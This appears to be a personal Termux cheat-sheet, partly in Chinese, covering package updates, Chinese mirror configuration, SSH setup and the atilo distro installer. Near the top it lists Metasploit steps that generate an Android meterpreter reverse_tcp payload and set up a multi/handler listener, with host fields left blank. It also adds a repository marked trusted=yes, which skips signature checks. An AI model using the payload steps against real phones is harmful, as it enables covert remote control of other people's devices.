# termux
---

apt update && apt upgrade

pkg install unstable-repo

pkg install metasploit

msfvenom -p android/meterpreter/reverse_tcp LHOST=

msfconsole

use exploit/multi/handler

set payload android/meterpreter/reverse_tcp

set LHOST 

set LPORT

expolit

pkg install vim

passwd

pgk upgrade

pkg install openssh 8022

sshd

pkill ssh

apt install tsu

tsu

echo "sshd" >> ~/.bashrc auto-ssh

termux-change-repo 

手动修改

编辑 $PREFIX/etc/apt/sources.list 修改为如下内容

deb https://mirrors.tuna.tsinghua.edu.cn/termux/termux-packages-24 stable main

编辑 $PREFIX/etc/apt/sources.list.d/science.list 修改为如下内容

deb https://mirrors.tuna.tsinghua.edu.cn/termux/science-packages-24 science stable

编辑 $PREFIX/etc/apt/sources.list.d/game.list 修改为如下内容

deb https://mirrors.tuna.tsinghua.edu.cn/termux/game-packages-24 games stable

---

Termux 会自动将环境变量 $PREFIX 设定为 /data/data/com.termux/files/usr

export EDITOR=vi

vi  $PREFIX/etc/apt/sources.list

apt edit-sources

pkg install apt-tools

proot

---

atilo

echo "deb [trusted=yes arch=all] https://yadominjinta.github.io/files/ termux extras" >> $PREFIX/etc/apt/sources.list.d/atilo.list

apt update && apt install atilo-cn

Atilo           2.0

Usage: atilo [命令] [参数]

Atilo 是一个用来帮助你在termux上安装不同的GNU/Linux发行版的程序

命令:

images           列出可用镜像

remove           移除本地的镜像

pull             拉取远的镜像

run              运行镜像

clean            清除缓存

help             帮助

---

/data/data/com.termux/files/usr/etc/apt/sources.list 为如下内容

源 deb https://mirrors.ustc.edu.cn/termux stable main

apachectl -k start /stop

termux-setup-storage
